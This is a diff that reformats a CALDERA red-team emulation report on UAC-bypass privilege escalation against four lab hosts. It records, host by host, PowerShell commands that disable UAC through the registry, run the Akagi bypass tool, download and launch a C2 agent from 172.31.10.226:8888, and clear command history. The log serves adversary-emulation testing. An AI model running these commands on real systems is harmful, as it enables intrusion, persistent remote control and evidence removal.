@@ -2,403 +2,360 @@
 Privilege Escalation
 ====================
 
-Contents
-========
+# CALDERA Operation Report
 
-* [Hosts Attacked](#hosts-attacked)
-* [Links](#links)
-	* [Host: ACME-HH-ZYQ](#host-acme-hh-zyq)
-	* [Host: ACME-HH-EUO](#host-acme-hh-euo)
-	* [Host: ACME-WS-PLU](#host-acme-ws-plu)
-	* [Host: ACME-HH-ESO](#host-acme-hh-eso)
-* [Steps](#steps)
-	* [Host: ACME-HH-ZYQ (paw: kwmxux)](#host-acme-hh-zyq-paw-kwmxux)
-		* [  Description: Set a registry key to allow UAC bypass](#--description-set-a-registry-key-to-allow-uac-bypass)
-		* [  Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe](#--description-dll-hijack-of-wow64-logger-wow64logdll-using-akagiexe)
-		* [  Description: UIPI bypass with uiAccess application](#--description-uipi-bypass-with-uiaccess-application)
-		* [  Description: Bypass user account controls - medium](#--description-bypass-user-account-controls---medium)
-	* [Host: ACME-HH-EUO (paw: acpuoe)](#host-acme-hh-euo-paw-acpuoe)
-		* [  Description: Set a registry key to allow UAC bypass](#--description-set-a-registry-key-to-allow-uac-bypass)
-		* [  Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe](#--description-dll-hijack-of-wow64-logger-wow64logdll-using-akagiexe)
-		* [  Description: UIPI bypass with uiAccess application](#--description-uipi-bypass-with-uiaccess-application)
-		* [  Description: Bypass user account controls - medium](#--description-bypass-user-account-controls---medium)
-	* [Host: ACME-WS-PLU (paw: hkrmxr)](#host-acme-ws-plu-paw-hkrmxr)
-		* [  Description: Set a registry key to allow UAC bypass](#--description-set-a-registry-key-to-allow-uac-bypass)
-		* [  Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe](#--description-dll-hijack-of-wow64-logger-wow64logdll-using-akagiexe)
-		* [  Description: UIPI bypass with uiAccess application](#--description-uipi-bypass-with-uiaccess-application)
-		* [  Description: Bypass user account controls - medium](#--description-bypass-user-account-controls---medium)
-	* [Host: ACME-HH-ESO (paw: nowkww)](#host-acme-hh-eso-paw-nowkww)
-		* [  Description: Set a registry key to allow UAC bypass](#--description-set-a-registry-key-to-allow-uac-bypass)
-		* [  Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe](#--description-dll-hijack-of-wow64-logger-wow64logdll-using-akagiexe)
-		* [  Description: UIPI bypass with uiAccess application](#--description-uipi-bypass-with-uiaccess-application)
-		* [  Description: Bypass user account controls - medium](#--description-bypass-user-account-controls---medium)
 
+**Operation:** Privilege Escalation<br>**Start:** 2024-09-13T17:39:39Z<br>**Adversary:** You Shall (Not) Bypass
 # Hosts Attacked
 
-|Host|User|Beachhead Command|PID|Parent PID|IP|C2 Server|
+|Host|User|Beachhead Cmd|PID|Parent PID|IPs|C2 Server|
 | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
 |ACME-HH-ZYQ|ACME\grantj|splunkd.exe|3872|4840|172.31.45.222|http://172.31.10.226:8888|
 |ACME-HH-EUO|ACME\grantj|splunkd.exe|1052|2004|172.31.41.178|http://172.31.10.226:8888|
 |ACME-WS-PLU|ACME\grantj|splunkd.exe|1116|8312|172.31.11.139, 172.25.240.1|http://172.31.10.226:8888|
 |ACME-HH-ESO|ACME\grantj|splunkd.exe|8376|8992|172.31.39.111|http://172.31.10.226:8888|
 
-# Links
+# Execution Timeline
 
-(what exactly is a link? seems to be a command executed when initializing the beachhead?)
-## Host: ACME-HH-ZYQ
 
+**[LINK] ACME-HH-ZYQ (kwmxux)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 2304
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-04T03:18:40Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-04T03:18:40Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 2304
 
+**Time:** 2024-09-04T03:18:40Z → 2024-09-04T03:18:40Z
 
-## Host: ACME-HH-EUO
 
+**[LINK] ACME-HH-EUO (acpuoe)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 4324
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-13T17:10:22Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-13T17:10:22Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 4324
 
+**Time:** 2024-09-13T17:10:22Z → 2024-09-13T17:10:22Z
 
-## Host: ACME-WS-PLU
 
+**[LINK] ACME-WS-PLU (hkrmxr)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 8504
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-13T17:12:11Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-13T17:12:12Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 8504
 
+**Time:** 2024-09-13T17:12:11Z → 2024-09-13T17:12:12Z
 
-## Host: ACME-HH-ESO
 
+**[LINK] ACME-HH-ESO (nowkww)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 10164
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-13T17:15:40Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-13T17:15:40Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 10164
 
+**Time:** 2024-09-13T17:15:40Z → 2024-09-13T17:15:40Z
 
-# Steps
 
-## Host: ACME-HH-ZYQ (paw: kwmxux)
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-###   Description: Set a registry key to allow UAC bypass
+**Command:** `New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force`
 
+**Description:** Set a registry key to allow UAC bypass
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-  Status: Failed
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
-  PID: 5212
+**Status:** `Failed`
 
-  Start: 2024-09-13T17:39:40Z
+**PID:** 5212
 
-  Command: 
-```powershell
-New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
-```
+**Time:** 2024-09-13T17:39:40Z → N/A
 
 
-###   Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
+**Command:** `.\Akagi64.exe 30 C:\Windows\System32\cmd.exe`
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**Description:** Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe
 
-  Status: Failed
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-  PID: 3228
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
-  Start: 2024-09-13T17:40:21Z
+**Status:** `Failed`
 
-  Command: 
-```powershell
-.\Akagi64.exe 30 C:\Windows\System32\cmd.exe
-```
+**PID:** 3228
 
+**Time:** 2024-09-13T17:40:21Z → N/A
 
-###   Description: UIPI bypass with uiAccess application
 
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**Command:** `$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"`
 
-  Status: Failed
+**Description:** UIPI bypass with uiAccess application
 
-  PID: 8740
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-  Start: 2024-09-13T17:42:29Z
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
-  Command: 
-```powershell
-$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"
-```
+**Status:** `Failed`
 
+**PID:** 8740
 
-###   Description: Bypass user account controls - medium
+**Time:** 2024-09-13T17:42:29Z → N/A
 
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-  Status: Failed
+**Command:** `$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;`
 
-  PID: 8132
+**Description:** Bypass user account controls - medium
 
-  Start: 2024-09-13T17:44:10Z
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-  Command: 
-```powershell
-$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;
-```
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
+**Status:** `Failed`
 
-## Host: ACME-HH-EUO (paw: acpuoe)
+**PID:** 8132
 
-###   Description: Set a registry key to allow UAC bypass
+**Time:** 2024-09-13T17:44:10Z → N/A
 
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  Status: Success
+**Command:** `New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force`
 
-  PID: 6508
+**Description:** Set a registry key to allow UAC bypass
 
-  Start: 2024-09-13T17:40:17Z
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-  Command: 
-```powershell
-New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
-```
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
+**Status:** `Success`
 
-###   Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe
+**PID:** 6508
 
+**Time:** 2024-09-13T17:40:17Z → N/A
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
 
-  Status: Failed
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  PID: 5924
+**Command:** `.\Akagi64.exe 30 C:\Windows\System32\cmd.exe`
 
-  Start: 2024-09-13T17:41:55Z
+**Description:** Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe
 
-  Command: 
-```powershell
-.\Akagi64.exe 30 C:\Windows\System32\cmd.exe
-```
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
-###   Description: UIPI bypass with uiAccess application
+**Status:** `Failed`
 
+**PID:** 5924
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**Time:** 2024-09-13T17:41:55Z → N/A
 
-  Status: Failed
 
-  PID: 6996
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  Start: 2024-09-13T17:43:52Z
+**Command:** `$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"`
 
-  Command: 
-```powershell
-$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"
-```
+**Description:** UIPI bypass with uiAccess application
 
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-###   Description: Bypass user account controls - medium
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
+**Status:** `Failed`
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**PID:** 6996
 
-  Status: Failed
+**Time:** 2024-09-13T17:43:52Z → N/A
 
-  PID: 3316
 
-  Start: 2024-09-13T17:45:27Z
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  Command: 
-```powershell
-$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;
-```
+**Command:** `$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;`
 
+**Description:** Bypass user account controls - medium
 
-## Host: ACME-WS-PLU (paw: hkrmxr)
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-###   Description: Set a registry key to allow UAC bypass
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
+**Status:** `Failed`
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**PID:** 3316
 
-  Status: Success
+**Time:** 2024-09-13T17:45:27Z → N/A
 
-  PID: 5012
 
-  Start: 2024-09-13T17:39:52Z
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Command: 
-```powershell
-New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
-```
+**Command:** `New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force`
 
+**Description:** Set a registry key to allow UAC bypass
 
-###   Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**Status:** `Success`
 
-  Status: Failed
+**PID:** 5012
 
-  PID: 920
+**Time:** 2024-09-13T17:39:52Z → N/A
 
-  Start: 2024-09-13T17:41:56Z
 
-  Command: 
-```powershell
-.\Akagi64.exe 30 C:\Windows\System32\cmd.exe
-```
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
+**Command:** `.\Akagi64.exe 30 C:\Windows\System32\cmd.exe`
 
-###   Description: UIPI bypass with uiAccess application
+**Description:** Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe
 
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
-  Status: Failed
+**Status:** `Failed`
 
-  PID: 8300
+**PID:** 920
 
-  Start: 2024-09-13T17:43:25Z
+**Time:** 2024-09-13T17:41:56Z → N/A
 
-  Command: 
-```powershell
-$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"
-```
 
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-###   Description: Bypass user account controls - medium
+**Command:** `$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"`
 
+**Description:** UIPI bypass with uiAccess application
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-  Status: Failed
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
-  PID: 5432
+**Status:** `Failed`
 
-  Start: 2024-09-13T17:45:29Z
+**PID:** 8300
 
-  Command: 
-```powershell
-$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;
-```
+**Time:** 2024-09-13T17:43:25Z → N/A
 
 
-## Host: ACME-HH-ESO (paw: nowkww)
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-###   Description: Set a registry key to allow UAC bypass
+**Command:** `$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;`
 
+**Description:** Bypass user account controls - medium
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-  Status: Failed
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
-  PID: 6172
+**Status:** `Failed`
 
-  Start: 2024-09-13T17:40:18Z
+**PID:** 5432
 
-  Command: 
-```powershell
-New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
-```
+**Time:** 2024-09-13T17:45:29Z → N/A
 
 
-###   Description: Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe
+**[STEP] ACME-HH-ESO (nowkww)**
 
+**Command:** `New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force`
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**Description:** Set a registry key to allow UAC bypass
 
-  Status: Failed
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-  PID: 9068
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
-  Start: 2024-09-13T17:42:19Z
+**Status:** `Failed`
 
-  Command: 
-```powershell
-.\Akagi64.exe 30 C:\Windows\System32\cmd.exe
-```
+**PID:** 6172
 
+**Time:** 2024-09-13T17:40:18Z → N/A
 
-###   Description: UIPI bypass with uiAccess application
 
+**[STEP] ACME-HH-ESO (nowkww)**
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**Command:** `.\Akagi64.exe 30 C:\Windows\System32\cmd.exe`
 
-  Status: Success
+**Description:** Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe
 
-  PID: 8324
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-  Start: 2024-09-13T17:42:55Z
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
-  Command: 
-```powershell
-$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"
-```
+**Status:** `Failed`
 
+**PID:** 9068
 
-###   Description: Bypass user account controls - medium
+**Time:** 2024-09-13T17:42:19Z → N/A
 
 
-  Attack: {'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}
+**[STEP] ACME-HH-ESO (nowkww)**
 
-  Status: Failed
+**Command:** `$url="http://172.31.10.226:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.Headers.add("server","http://172.31.10.226:8888");$wc.Headers.add("defaultSleep","60");$wc.Headers.add("defaultGroup","bypassed_u_bro");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);.\Akagi64.exe 32 "C:\Users\Public\$name.exe -server http://172.31.10.226:8888"`
 
-  PID: 3188
+**Description:** UIPI bypass with uiAccess application
 
-  Start: 2024-09-13T17:45:39Z
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
 
-  Command: 
-```powershell
-$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;
-```
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
 
+**Status:** `Success`
+
+**PID:** 8324
+
+**Time:** 2024-09-13T17:42:55Z → N/A
+
+
+**[STEP] ACME-HH-ESO (nowkww)**
+
+**Command:** `$url="http://172.31.10.226:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group red"; };Receive-Job -Job $job -Wait;`
+
+**Description:** Bypass user account controls - medium
+
+**Technique:** Abuse Elevation Control Mechanism: Bypass User Access Control
+
+**ATT&CK:** [T1548.002](https://attack.mitre.org/techniques/T1548/002)
+
+**Status:** `Failed`
+
+**PID:** 3188
+
+**Time:** 2024-09-13T17:45:39Z → N/A
+
+
+![Operation Graph](privilege_escalation_graph.png)
